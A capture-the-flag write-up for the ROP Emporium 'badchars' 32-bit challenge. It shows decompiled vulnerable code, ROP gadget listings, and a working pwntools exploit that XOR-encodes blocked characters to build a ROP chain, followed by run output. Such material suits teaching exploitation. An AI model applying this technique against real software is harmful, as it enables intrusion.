# checkpoint
some chars of our rop chain are blocked, figure how to bypass the char check.
**hint:** XOR op. op twice to rebuild content.

# analyze

**IDA file: libbadchars32.so**
```c
int pwnme()
{
  unsigned int v1; // [esp+0h] [ebp-38h]
  unsigned int i; // [esp+4h] [ebp-34h]
  unsigned int j; // [esp+8h] [ebp-30h]
  char v4[36]; // [esp+10h] [ebp-28h] BYREF

  setvbuf(stdout, 0, 2, 0);
  puts("badchars by ROP Emporium");
  puts("x86\n");
  memset(v4, 0, 0x20u);
  puts("badchars are: 'x', 'g', 'a', '.'");
  printf("> ");
  v1 = read(0, v4, 0x200u);     // overflow vuln
  for ( i = 0; i < v1; ++i )
  {
    for ( j = 0; j <= 3; ++j )
    {
      if ( v4[i] == badcharacters[j] )      // modified the char that in badchars
        v4[i] = -21;
    }
  }
  return puts("Thank you!");
}
```


**gadget**
```shell
➜  32 ROPgadget --binary ./badchars32 --only "pop|ret" 
Gadgets information
============================================================
0x080485bb : pop ebp ; ret
0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret    # used
0x0804839d : pop ebx ; ret
0x080485ba : pop edi ; pop ebp ; ret
0x080485b9 : pop esi ; pop edi ; pop ebp ; ret      # used
0x08048386 : ret
0x0804849e : ret 0xeac1

➜  32 ROPgadget --binary ./badchars32 --only "mov|ret"         
Gadgets information
============================================================
0x080484e7 : mov al, byte ptr [0xc9010804] ; ret
0x0804854f : mov dword ptr [edi], esi ; ret     # used
0x08048381 : mov ebx, 0x81000000 ; ret
0x08048423 : mov ebx, dword ptr [esp] ; ret
0x08048386 : ret
0x0804849e : ret 0xeac1

Unique gadgets found: 6

➜  x86 ROPgadget --binary badchars32 --only "xor|ret"
Gadgets information
============================================================
0x08048386 : ret
0x0804849e : ret 0xeac1
0x08048547 : xor byte ptr [ebp], bl ; ret   # used

Unique gadgets found: 3
```

# expolit

```python
from pwn import *

pipe = process("./badchars32",env={"LD_PRELOAD":"./libbadchars32.so"})

print_file_plt = 0x080483d0
targetMem = 0x0804af00
pop_ebx_esi_edi_ebp_ret = 0x080485b8
pop_esi_edi_ebp_ret = 0x080485b9
esi2EDI = 0x0804854f
pop_ebp_ret = 0x080485bb 

flag = "flag.txt"
badchars = ['x','g','a','.']
reFlag = b""
for i in range(len(flag)):
    if flag[i] in badchars:
        reFlag += chr(ord(flag[i]) ^ 1)     # xor op with 1
    else:
        reFlag += flag[i]
# print(reFlag)

chain = "E" * 44
chain += p32(pop_ebx_esi_edi_ebp_ret)
chain += p32(1)                 # ebx for xor op -> bl
chain += reFlag[:4]             # esi
chain += p32(targetMem)         # edi
chain += p32(0)             
chain += p32(esi2EDI)

chain += p32(pop_esi_edi_ebp_ret)
chain += reFlag[4:]             # esi
chain += p32(targetMem+4)       # edi
chain += p32(0)
chain += p32(esi2EDI)

# ------------ back -------------
chain += p32(pop_ebp_ret)
chain += p32(targetMem + 2)
chain += p32(0x08048547)        # xor byte ptr [ebp], bl ; ret 

chain += p32(pop_ebp_ret)
chain += p32(targetMem + 3)
chain += p32(0x08048547)        # xor byte ptr [ebp], bl ; ret 

chain += p32(pop_ebp_ret)
chain += p32(targetMem + 4)
chain += p32(0x08048547)        # xor byte ptr [ebp], bl ; ret 

chain += p32(pop_ebp_ret)
chain += p32(targetMem + 6)
chain += p32(0x08048547)        # xor byte ptr [ebp], bl ; ret 

chain += p32(print_file_plt)
chain += p32(0xdeadbeef)
chain += p32(targetMem)

# context.log_level = "DEBUG"
print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recv())

```
**run exp.py**
```shell
➜  x86 python ./exp.py
[+] Starting local process './badchars32': pid 68069
[DEBUG] Received 0x41 bytes:
    'badchars by ROP Emporium\n'
    'x86\n'
    '\n'
    "badchars are: 'x', 'g', 'a', '.'\n"
    '> '
badchars by ROP Emporium
x86

badchars are: 'x', 'g', 'a', '.'
> 
[DEBUG] Sent 0x95 bytes:
    00000000  45 45 45 45  45 45 45 45  45 45 45 45  45 45 45 45  │EEEE│EEEE│EEEE│EEEE│
    *
    00000020  45 45 45 45  45 45 45 45  45 45 45 45  b8 85 04 08  │EEEE│EEEE│EEEE│····│
    00000030  01 00 00 00  66 6c 60 66  00 af 04 08  00 00 00 00  │····│fl`f│····│····│
    00000040  4f 85 04 08  b9 85 04 08  2f 74 79 74  04 af 04 08  │O···│····│/tyt│····│
    00000050  00 00 00 00  4f 85 04 08  bb 85 04 08  02 af 04 08  │····│O···│····│····│
    00000060  47 85 04 08  bb 85 04 08  03 af 04 08  47 85 04 08  │G···│····│····│G···│
    00000070  bb 85 04 08  04 af 04 08  47 85 04 08  bb 85 04 08  │····│····│G···│····│
    00000080  06 af 04 08  47 85 04 08  d0 83 04 08  ef be ad de  │····│G···│····│····│
    00000090  00 af 04 08  0a                                     │····│·│
    00000095
[DEBUG] Received 0x2c bytes:
    'Thank you!\n'
    'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}        # flag

[*] Stopped process './badchars32' (pid 68069)
```

